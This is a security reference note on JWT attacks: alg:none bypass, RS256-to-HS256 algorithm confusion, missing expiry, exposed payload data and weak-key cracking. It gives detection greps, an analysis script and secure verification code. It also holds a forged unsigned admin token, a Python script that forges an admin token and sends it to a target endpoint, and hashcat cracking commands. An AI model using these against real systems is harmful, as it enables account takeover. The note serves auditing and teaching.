# JWT — Algorithm Confusion & Attacks

**Tags:** #high #jwt #authentication #token #algorithm-confusion
**OWASP:** A07:2021 Identification and Authentication Failures
**CVSS Base:** 8.1 (High)

---

## 📖 What is it

JSON Web Tokens (JWT) are stateless authentication tokens. Vulnerabilities arise when the server does not correctly validate the signing algorithm or accepts manipulated tokens as valid.

---

## 🔍 `grep_search` Tactics

```
jwt.sign(
jwt.verify(
JWT.decode(
JwtBuilder
decode(token
verify(token
jsonwebtoken
jjwt
PyJWT
jose
```

---

## 💣 Attacks by Category

### 1. `alg: none` Bypass

**How it works:** some servers accept tokens with `alg: none` in the header, treating the signature as optional.

```
Original header:  {"alg":"HS256","typ":"JWT"}
Malicious header: {"alg":"none","typ":"JWT"}

Edited payload:   {"sub":"admin","role":"superuser"}
Signature:        empty (removed)

Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ.
```

**Static detection:** Does the server enforce the accepted algorithm?
```javascript
//  VULNERABLE — accepts the alg from the token itself
jwt.verify(token, secret);

//  CORRECT — enforces the algorithm
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

---

### 2. RS256 → HS256 Downgrade (Algorithm Confusion)

**How it works:** if the server uses RS256 (asymmetric: signs with private key, validates with public key), an attacker takes the **public** key (often available) and signs a forged token using HMAC with it as the secret.

```
Condition: server accepts HS256 even when configured for RS256
Attack: sign token with HMAC-SHA256 using the RSA public key as the secret
```

```python
# .tmp/jwt_confusion.py
import jwt
import requests

# Public key obtained from /api/.well-known/jwks.json or /.well-known/openid-configuration
public_key = open("public.pem").read()

# Forge token as admin using the public key as HMAC secret
forged = jwt.encode(
    {"sub": "1337", "role": "admin"},
    public_key,
    algorithm="HS256"
)

r = requests.get("http://target.com/api/admin", headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.text[:200])
```

---

### 3. Missing `exp` or Excessive Expiration

```python
#  VULNERABLE — no expiration
token = jwt.encode({"sub": user_id, "role": "admin"}, secret)

#  CORRECT — short expiration
from datetime import datetime, timedelta, timezone
token = jwt.encode({
    "sub": user_id,
    "exp": datetime.now(timezone.utc) + timedelta(hours=1)
}, secret, algorithm="HS256")
```

---

### 4. Sensitive Data in the Payload

> JWT is not encrypted by default — only signed. The payload is Base64-decodable by anyone.

```bash
# Decode payload without special tools
echo "eyJzdWIiOiIxMjM0IiwicGFzc3dvcmQiOiJzZWNyZXQifQ==" | base64 -d
# → {"sub":"1234","password":"secret"}    EXPOSED
```

**Detection:** check whether fields like `password`, `credit_card`, `ssn`, `private_key` are present in the claims.

---

### 5. Weak Key (Offline Brute Force)

If the algorithm is HS256 with a weak secret, the token can be cracked offline:

```bash
# Using hashcat
hashcat -a 0 -m 16500 eyJ...token...Here /usr/share/wordlists/rockyou.txt

# Using jwt-cracker
jwt-cracker eyJ...token...Here wordlist.txt
```

---

## 🛠️ JWT Analysis Script

```python
# .tmp/analyze_jwt.py
import base64, json, sys

def decode_part(part):
    # Padding fix
    padded = part + '=' * (4 - len(part) % 4)
    return json.loads(base64.b64decode(padded))

token = sys.argv[1] if len(sys.argv) > 1 else input("JWT Token: ")
parts = token.split('.')

if len(parts) != 3:
    print("[WARN] Malformed token or missing signature (alg:none candidate?)")
else:
    header = decode_part(parts[0])
    payload = decode_part(parts[1])
    sig_len = len(parts[2])
    
    print(f"\n📋 HEADER: {json.dumps(header, indent=2)}")
    print(f"\n📦 PAYLOAD: {json.dumps(payload, indent=2)}")
    print(f"\n🔑 Signature present: {'YES' if sig_len > 0 else '🚨 NO (alg:none candidate!)'}")
    
    # Alerts
    if header.get('alg') == 'none':
        print("\n🚨 CRITICAL: alg=none detected!")
    if 'exp' not in payload:
        print("\n⚠️  HIGH: no exp field → token never expires!")
    if 'password' in payload or 'secret' in payload:
        print("\n⚠️  MEDIUM: sensitive data in payload!")
```

---

## 🛡️ Fix

```javascript
//  Node.js — secure validation
const jwt = require('jsonwebtoken');

// Fix algorithm, verify issuer and audience
const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],
  issuer: 'myapp.com',
  audience: 'myapp-users'
});
```

```python
#  Python — secure PyJWT
import jwt
payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],    # explicit list, never omit
    options={"require": ["exp", "iat", "sub"]}
)
```

---

## 🔗 Chain Exploits

```
JWT Algorithm Confusion → Total Admin Takeover
JWT without exp + XSS → Stolen token has infinite validity
JWT payload with sensitive data + MitM → Credential exposure
```

---

## 📌 References
- [[oauth-2.0-saml-protocol-attacks]]
- [[authentication-session-management]]
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)